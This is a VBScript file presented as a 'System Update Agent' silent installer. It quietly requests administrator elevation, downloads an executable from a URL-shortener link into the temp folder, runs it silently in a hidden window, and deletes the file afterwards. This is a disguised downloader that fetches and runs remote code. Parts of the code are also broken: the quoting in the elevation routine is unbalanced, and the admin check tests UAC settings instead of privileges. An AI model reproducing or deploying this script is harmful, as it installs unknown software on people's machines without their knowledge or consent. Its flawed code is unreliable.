
' --------------------------------------------------------------------------
'  System Update Agent - Silent Installer
' --------------------------------------------------------------------------
Option Explicit

' Constants
Const TEMP_FOLDER = 2
Const OVERWRITE = 2

' Global objects
Dim objShell, objFSO, objNetwork
Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objNetwork = CreateObject("WScript.Network")

' Check for admin privileges
If Not IsAdmin() Then
    ElevateScript()
    WScript.Quit
End If

' Main execution
Main()

Sub Main()
    Dim downloadUrl, tempPath, installerPath, result
    
    ' Configuration
    downloadUrl = "https://share.google/zwqwLoZiVh08jLOa4"
    tempPath = objFSO.GetSpecialFolder(TEMP_FOLDER).Path
    installerPath = tempPath & "\sysupdate.exe"
    
    ' Log the start
    LogEvent "Starting installation from: " & downloadUrl
    
    ' Download the installer
    result = DownloadFile(downloadUrl, installerPath)
    If Not result Then
        LogEvent "Failed to download installer"
        Exit Sub
    End If
    
    ' Execute the installer silently
    LogEvent "Executing installer: " & installerPath
    ExecuteInstaller installerPath
    
    ' Cleanup
    If objFSO.FileExists(installerPath) Then
        objFSO.DeleteFile installerPath, True
        LogEvent "Installer file cleaned up"
    End If
End Sub

Function IsAdmin()
    On Error Resume Next
    IsAdmin = (objShell.RegRead("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA") = 1)
    If Err.Number <> 0 Then IsAdmin = True
    On Error GoTo 0
End Function

Sub ElevateScript()
    Dim scriptPath, args
    scriptPath = """" & WScript.ScriptFullName & """
    args = "/elevated"
    
    LogEvent "Requesting elevation"
    CreateObject("Shell.Application").ShellExecute "wscript.exe", scriptPath & " " & args, "", "runas", 0
End Sub

Function DownloadFile(url, destination)
    On Error Resume Next
    Dim objHTTP, objStream, finalUrl
    
    LogEvent "Downloading from: " & url
    
    Set objHTTP = CreateObject("MSXML2.XMLHTTP")
    objHTTP.Open "GET", url, False
    objHTTP.Send
    
    ' Check for redirect (301, 302, etc.)
    If objHTTP.Status >= 300 And objHTTP.Status < 400 Then
        finalUrl = objHTTP.getResponseHeader("Location")
        LogEvent "Redirect detected to: " & finalUrl
        objHTTP.Open "GET", finalUrl, False
        objHTTP.Send
    End If
    
    If objHTTP.Status <> 200 Then
        LogEvent "Download failed with status: " & objHTTP.Status
        DownloadFile = False
        Exit Function
    End If
    
    Set objStream = CreateObject("ADODB.Stream")
    objStream.Type = 1 ' Binary
    objStream.Open
    objStream.Write objHTTP.ResponseBody
    objStream.SaveToFile destination, OVERWRITE
    objStream.Close
    
    LogEvent "Download completed to: " & destination
    DownloadFile = (Err.Number = 0)
End Function

Sub ExecuteInstaller(installerPath)
    Dim command
    command = """" & installerPath & """ /S /D=" & objShell.ExpandEnvironmentStrings("%ProgramFiles%")
    
    LogEvent "Running command: " & command
    objShell.Run command, 0, True
    LogEvent "Installer execution completed"
End Sub

Sub LogEvent(message)
    ' Log to Windows Application Event Log
    objShell.LogEvent 1, "System Update Agent: " & message
    
    ' Also log to a file for debugging
    Dim logFile, logPath
    logPath = objShell.ExpandEnvironmentStrings("%TEMP%")
    logFile = logPath & "\sysupdate.log"
    
    Dim objFSO, objTextStream
    Set objFSO = CreateObject("Scripting.FileSystemObject")
    Set objTextStream = objFSO.OpenTextFile(logFile, 8, True) ' 8 = ForAppending
    objTextStream.WriteLine Now & " - " & message
    objTextStream.Close
End Sub
